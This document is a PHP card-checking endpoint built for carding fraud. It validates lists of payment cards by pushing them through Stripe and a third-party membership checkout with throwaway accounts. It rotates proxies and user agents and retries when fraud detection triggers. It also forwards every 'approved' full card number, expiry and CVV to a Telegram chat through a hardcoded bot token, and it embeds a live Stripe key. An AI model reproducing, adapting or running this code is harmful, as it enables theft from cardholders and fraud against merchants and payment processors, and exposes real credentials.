<?php
header('Content-Type: application/json');
error_reporting(0);

class CCChecker {
    private $stripe_pk = 'pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s';
    private $proxies = [];
    private $currentProxyIndex = 0;
    private $binCache = [];

    public function __construct($proxyList = null) {
        if ($proxyList) {
            if (is_string($proxyList)) {
                // Split proxy list by newlines and filter empty lines
                $this->proxies = array_filter(explode("\n", trim($proxyList)));
            } elseif (is_array($proxyList)) {
                $this->proxies = array_filter($proxyList);
            }
        }
    }

private function getNextProxy() {
    if (empty($this->proxies)) {
        return null; // Return null instead of throwing an exception
    }
    
    // Shuffle proxies occasionally
    if ($this->currentProxyIndex === 0) {
        shuffle($this->proxies);
    }
    
    $proxy = $this->proxies[$this->currentProxyIndex];
    $this->currentProxyIndex = ($this->currentProxyIndex + 1) % count($this->proxies);
    
    return trim($proxy);
}
private function validateProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org?format=json');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $proxyConfig = $this->parseProxy($proxy);
    $this->setupCurlProxy($ch, $proxyConfig);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}

// Add getCurrentProxy here
public function getCurrentProxy() {
    if (empty($this->proxies)) {
        return null;
    }
    // Get the previously used proxy index
    $lastIndex = ($this->currentProxyIndex - 1 + count($this->proxies)) % count($this->proxies);
    return trim($this->proxies[$lastIndex]);
}
    
    private function parseProxy($proxyString) {
    // Clean the proxy string
    $proxyString = trim($proxyString);
    
    // Initialize proxy configuration array
    $proxyConfig = [
        'host' => '',
        'port' => '',
        'username' => '',
        'password' => '',
        'type' => CURLPROXY_HTTP
    ];
    
    // Handle brightdata proxy format
    if (strpos($proxyString, 'brd.superproxy.io') !== false) {
        $parts = explode(':', $proxyString);
        if (count($parts) >= 4) {
            $proxyConfig['host'] = $parts[0];
            $proxyConfig['port'] = $parts[1];
            $proxyConfig['username'] = $parts[2];
            $proxyConfig['password'] = implode(':', array_slice($parts, 3));
            return $proxyConfig;
        }
    }
    
    // Handle URL format
    if (strpos($proxyString, '://') !== false) {
        $parsed = parse_url($proxyString);
        if ($parsed) {
            $proxyConfig['host'] = $parsed['host'];
            $proxyConfig['port'] = $parsed['port'] ?? '80';
            $proxyConfig['username'] = $parsed['user'] ?? '';
            $proxyConfig['password'] = $parsed['pass'] ?? '';
            
            // Set proxy type based on scheme
            switch ($parsed['scheme']) {
                case 'socks5':
                    $proxyConfig['type'] = CURLPROXY_SOCKS5;
                    break;
                case 'socks4':
                    $proxyConfig['type'] = CURLPROXY_SOCKS4;
                    break;
                default:
                    $proxyConfig['type'] = CURLPROXY_HTTP;
            }
            return $proxyConfig;
        }
    }
    
    // Handle IP:PORT:USER:PASS format
    $parts = explode(':', $proxyString);
    switch (count($parts)) {
        case 2: // IP:PORT
            $proxyConfig['host'] = $parts[0];
            $proxyConfig['port'] = $parts[1];
            break;
            
        case 4: // IP:PORT:USER:PASS
            $proxyConfig['host'] = $parts[0];
            $proxyConfig['port'] = $parts[1];
            $proxyConfig['username'] = $parts[2];
            $proxyConfig['password'] = $parts[3];
            break;
            
        default:
            throw new Exception('Invalid proxy format');
    }
    
    return $proxyConfig;
}

private function setupCurlProxy($ch, $proxyConfig) {
    if (empty($proxyConfig['host']) || empty($proxyConfig['port'])) {
        return false;
    }
    
    // Set proxy host and port
    curl_setopt($ch, CURLOPT_PROXY, $proxyConfig['host']);
    curl_setopt($ch, CURLOPT_PROXYPORT, $proxyConfig['port']);
    
    // Set proxy type
    curl_setopt($ch, CURLOPT_PROXYTYPE, $proxyConfig['type']);
    
    // Set proxy authentication if provided
    if (!empty($proxyConfig['username']) && !empty($proxyConfig['password'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyConfig['username'] . ':' . $proxyConfig['password']);
    }
    
    // Additional options for better proxy handling
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
    curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
    
    return true;
}

private function setupCurl($url, $headers = []) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TCP_FASTOPEN => 1,
        CURLOPT_TCP_NODELAY => 1,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
        CURLOPT_ENCODING => 'gzip,deflate',
        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4
    ]);
    
    return $ch;
}

private function generateBrowserData() {
    $browsers = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
    ];
    
    return [
        'userAgent' => $browsers[array_rand($browsers)],
    ];
}

private function getBinInfo($cc) {
    $bin = substr($cc, 0, 6);
    
    // Check cache first
    if (isset($this->binCache[$bin])) {
        return $this->binCache[$bin];
    }

    // First API - binlist.net
    $ch = $this->setupCurl("https://lookup.binlist.net/$bin", [
        'Accept-Version: 3',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $data = json_decode($response, true);
        if ($data) {
            $binInfo = sprintf(
                "%s - %s - %s - %s",
                strtoupper($data['scheme'] ?? 'Unknown'),
                strtoupper($data['type'] ?? 'Unknown'),
                strtoupper($data['brand'] ?? 'Unknown'),
                $data['country']['name'] ?? 'Unknown'
            );
            $this->binCache[$bin] = $binInfo;
            return $binInfo;
        }
    }

    // Second API - binlist.io
    $ch = $this->setupCurl("https://binlist.io/lookup/$bin/", [
        'Accept: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $data = json_decode($response, true);
        if ($data) {
            $binInfo = sprintf(
                "%s - %s - %s - %s %s",
                strtoupper($data['scheme'] ?? 'Unknown'),
                strtoupper($data['type'] ?? 'Unknown'),
                strtoupper($data['category'] ?? 'Unknown'),
                $data['country']['name'] ?? 'Unknown',
                $data['country']['emoji'] ?? ''
            );
            $this->binCache[$bin] = $binInfo;
            return $binInfo;
        }
    }


    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $data = json_decode($response, true);
        if ($data && isset($data['data'])) {
            $binData = $data['data'];
            $binInfo = sprintf(
                "%s - %s - %s - %s",
                strtoupper($binData['scheme'] ?? 'Unknown'),
                strtoupper($binData['type'] ?? 'Unknown'),
                strtoupper($binData['brand'] ?? 'Unknown'),
                $binData['country']['name'] ?? 'Unknown'
            );
            $this->binCache[$bin] = $binInfo;
            return $binInfo;
        }
    }

    // Fourth API (Free API) - bincheck.io
    $ch = $this->setupCurl("https://bincheck.io/bin/$bin", [
        'Accept: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $data = json_decode($response, true);
        if ($data) {
            $binInfo = sprintf(
                "%s - %s - %s - %s",
                strtoupper($data['brand'] ?? 'Unknown'),
                strtoupper($data['type'] ?? 'Unknown'),
                strtoupper($data['level'] ?? 'Unknown'),
                $data['country']['name'] ?? 'Unknown'
            );
            $this->binCache[$bin] = $binInfo;
            return $binInfo;
        }
    }

    // If all APIs fail
    return "BIN Not Found";
}

    public function processCard($cardData) {
        // Clean the input
        $cardData = trim($cardData);
        
        // Parse different card formats
        $cc = $month = $year = $cvv = null;
        
        if (strpos($cardData, '|') !== false) {
            $parts = explode('|', $cardData);
            $cc = trim($parts[0]);
            
            if (count($parts) === 3) {
                // Format: CC|MM/YYYY|CVV or CC|MM/YY|CVV
                $dateParts = explode('/', $parts[1]);
                $month = trim($dateParts[0]);
                $year = trim($dateParts[1]);
                $cvv = trim($parts[2]);
            } else {
                $month = trim($parts[1]);
                $year = trim($parts[2]);
                $cvv = trim($parts[3]);
            }
        } elseif (strpos($cardData, '/') !== false) {
            $parts = explode('/', $cardData);
            $cc = trim($parts[0]);
            $month = trim($parts[1]);
            if (strlen($parts[2]) > 2) {
                $year = substr(trim($parts[2]), 0, 4);
                $cvv = substr(trim($parts[2]), 4);
            } else {
                $year = trim($parts[2]);
                $cvv = trim($parts[3]);
            }
        }

        // Validate card number
        if (!$this->luhnCheck($cc)) {
            return [
                'status' => 'ERROR',
                'message' => 'Invalid card number (Luhn check failed)',
                'logo' => '❌',
                'bin_info' => $this->getBinInfo($cc)
            ];
        }

        // Standardize year format
        if (strlen($year) === 4) {
            $year = substr($year, -2);
        }

        // Get BIN information
        $binInfo = $this->getBinInfo($cc);
    
    // Check card with Stripe
    $result = $this->checkCard($cc, $month, $year, $cvv);
    $result['bin_info'] = $binInfo;
    
    // If card is approved, send to Telegram
    if ($result['status'] === 'APPROVED') {
        $telegramMessage = "✅ <b>CC APPROVED</b>\n\n" .
            "💳 Card: <code>{$cc}|{$month}|{$year}|{$cvv}</code>\n" .
            "📊 Status: {$result['message']}\n" .
            "ℹ️ Bin Info: {$binInfo}\n" .
            "⏰ Time: " . date('Y-m-d H:i:s') . "\n\n" .
            "🔍 Checked By @YourBotUsername";
        
        $this->sendToTelegram($telegramMessage);
    }
    
    return $result;
    }

private function checkCard($cc, $month, $year, $cvv) {
    try {
        usleep(rand(100000, 300000)); // 0.1 to 0.3 seconds
        
        // Get proxy if available, but don't require it
        $proxy = $this->getNextProxy();
        $proxyConfig = null;
        if ($proxy) {
            $proxyConfig = $this->parseProxy($proxy);
        }

        // First request - Get the checkout page to obtain nonce
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://ecstest.net/membership-checkout/?level=7');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        ]);
        
        // Setup proxy for first request if available
        if ($proxyConfig) {
            $this->setupCurlProxy($ch, $proxyConfig);
        }
        
        $response1 = curl_exec($ch);
        curl_close($ch);

        // Extract PHPSESSID from headers
        preg_match('/PHPSESSID=([^;]+)/', $response1, $session_matches);
        $phpsessid = $session_matches[1] ?? '';

        // Extract nonce from page content
        preg_match('/name="pmpro_checkout_nonce" value="([^"]+)"/', $response1, $nonce_matches);
        $nonce = $nonce_matches[1] ?? '';

        if (empty($nonce)) {
            return [
                'status' => 'ERROR',
                'message' => 'Could not obtain checkout nonce',
                'logo' => '❌'
            ];
        }

        // Second request - Create Stripe token
       $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://js.stripe.com',
            'referer: https://js.stripe.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        ]);

        // Setup proxy for second request if available
        if ($proxyConfig) {
            $this->setupCurlProxy($ch, $proxyConfig);
        }


        $postData = http_build_query([
            'type' => 'card',
            'card[number]' => $cc,
            'card[cvc]' => $cvv,
            'card[exp_month]' => $month,
            'card[exp_year]' => $year,
            'guid' => $this->generateGuid(),
            'muid' => $this->generateGuid(),
            'sid' => $this->generateGuid(),
            'key' => $this->stripe_pk,
            'payment_user_agent' => 'stripe.js/v3'
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        $response2 = curl_exec($ch);
        curl_close($ch);

        $result2 = json_decode($response2, true);
        if (!isset($result2['id'])) {
            return [
                'status' => 'DECLINED',
                'message' => $result2['error']['message'] ?? 'Payment method creation failed',
                'logo' => '❌'
            ];
        }

        // Third request - Process payment
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://ecstest.net/membership-checkout/?level=7');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://ecstest.net',
            'referer: https://ecstest.net/membership-checkout/?level=7',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
        ]);

        // Setup proxy for third request
       if ($proxyConfig) {
            $this->setupCurlProxy($ch, $proxyConfig);
        }

        // Set cookies
        curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=$phpsessid");

        $email = $this->generateRandomEmail();
        $username = 'user_' . rand(1000, 9999);
        $password = 'Pass' . rand(1000, 9999) . '!';

        $postData = http_build_query([
            'level' => '7',
            'checkjavascript' => '1',
            'username' => $username,
            'password' => $password,
            'password2' => $password,
            'bemail' => $email,
            'bconfirmemail' => $email,
            'gateway' => 'stripe',
            'CardType' => $result2['card']['brand'],
            'payment_method_id' => $result2['id'],
            'AccountNumber' => 'XXXXXXXXXXXX' . substr($cc, -4),
            'ExpirationMonth' => $month,
            'ExpirationYear' => '20' . $year,
            'pmpro_checkout_nonce' => $nonce,
            'submit-checkout' => '1',
            'javascriptok' => '1'
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        $response3 = curl_exec($ch);
        curl_close($ch);

        return $this->processResponse($response3);

    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'message' => $e->getMessage(),
            'logo' => '❌'
        ];
    }
}

private function makeRequest($ch, $maxRetries = 3) {
    $attempt = 0;
    while ($attempt < $maxRetries) {
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        if (strpos($response, 'Suspicious activity detected') !== false) {
            $attempt++;
            if ($attempt < $maxRetries) {
                // Change proxy
                $proxy = $this->getNextProxy();
                if ($proxy) {
                    $proxyConfig = $this->parseProxy($proxy);
                    $this->setupCurlProxy($ch, $proxyConfig);
                }
                // Add delay before retry
                sleep(rand(2, 5));
                continue;
            }
        }
        return $response;
    }
    throw new Exception('Maximum retries reached for suspicious activity');
}
    
    private function sendToTelegram($message) {
    $botToken = '8158357066:AAG2Y_2sJgThSLYAkNIdemLImYTuO_JNEOs';
    $chatId = '-1002470669486';
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POST, true);
    
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ]);
    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    return $response;
}

private function processResponse($response) {
    try {
        // First try to parse as JSON in case of API errors
        $jsonResponse = json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($jsonResponse['error'])) {
            return [
                'status' => 'DECLINED',
                'message' => $jsonResponse['error']['message'],
                'logo' => '❌'
            ];
        }

        // Extract error message from HTML response
        if (preg_match('/<div[^>]*pmpro_message[^>]*>(.*?)<\/div>/s', $response, $matches)) {
            $error_message = trim(strip_tags($matches[1]));
            
            // Check for success messages
            if (strpos($error_message, 'success') !== false || 
                strpos($error_message, 'thank you') !== false || 
                strpos($error_message, 'approved') !== false) {
                return [
                    'status' => 'APPROVED',
                    'message' => 'CVV MATCH',
                    'logo' => '✅'
                ];
            }
            
            // Check for CCN Match indicators
            $ccnIndicators = [
                'card does not support this type',
                'insufficient_funds',
                'incorrect_zip',
                'security code is incorrect',
                'incorrect_cvc',
                'CVC check failed',
                'security code is invalid',
                'card zip invalid'
            ];
            
            foreach ($ccnIndicators as $indicator) {
                if (stripos($error_message, $indicator) !== false) {
                    return [
                        'status' => 'APPROVED',
                        'message' => 'CCN MATCH - ' . $error_message,
                        'logo' => '✅'
                    ];
                }
            }
            
            // For all other error messages
            return [
                'status' => 'DECLINED',
                'message' => $error_message,
                'logo' => '❌'
            ];
        }
        
        // If no error message found in HTML
        if (strpos($response, 'Thank you') !== false || 
            strpos($response, 'Success') !== false || 
            strpos($response, 'approved') !== false) {
            return [
                'status' => 'APPROVED',
                'message' => 'CVV MATCH',
                'logo' => '✅'
            ];
        }

        // Default response if no specific message found
        return [
            'status' => 'DECLINED',
            'message' => 'Card Declined',
            'logo' => '❌'
        ];

    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'message' => 'Processing Error: ' . $e->getMessage(),
            'logo' => '❌'
        ];
    }
}

    private function luhnCheck($number) {
        $sum = 0;
        $numDigits = strlen($number);
        $parity = $numDigits % 2;
        
        for ($i = $numDigits - 1; $i >= 0; $i--) {
            $digit = intval($number[$i]);
            if ($i % 2 == $parity) {
                $digit *= 2;
                if ($digit > 9) {
                    $digit -= 9;
                }
            }
            $sum += $digit;
        }
        
        return ($sum % 10) == 0;
    }

    private function generateGuid() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function generateRandomEmail() {
        $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'];
        return 'user_' . rand(1000, 9999) . '@' . $domains[array_rand($domains)];
    }

    private function extractError($response) {
        if (preg_match('/<div[^>]*pmpro_message[^>]*>(.*?)<\/div>/s', $response, $matches)) {
            return trim(strip_tags($matches[1]));
        }
        return null;
    }
}





// Main processing
// Main processing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        // Get the raw POST data and decode as JSON
        $input = file_get_contents('php://input');
        $data = json_decode($input, true);
        
        // If JSON decode fails, try regular POST data
        if (json_last_error() !== JSON_ERROR_NONE) {
            $cc_data = $_POST['cc_data'] ?? '';
            $proxy_list = $_POST['proxy_list'] ?? '';
        } else {
            $cc_data = $data['cc_data'] ?? '';
            $proxy_list = $data['proxy_list'] ?? '';
        }
        
        if (empty($cc_data)) {
            throw new Exception('No card data provided');
        }

        $checker = new CCChecker($proxy_list);
        $result = $checker->processCard($cc_data);
        
        // Add the used proxy to the result if available
        if ($proxy_list) {
            $result['proxy_used'] = $checker->getCurrentProxy();
        }
        
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
        
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'ERROR',
            'message' => $e->getMessage(),
            'logo' => '❌'
        ]);
    }
    exit;
}


// If not POST request
header('Content-Type: application/json');
echo json_encode([
    'status' => 'ERROR',
    'message' => 'Invalid request method',
    'logo' => '❌'
], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
exit;
?>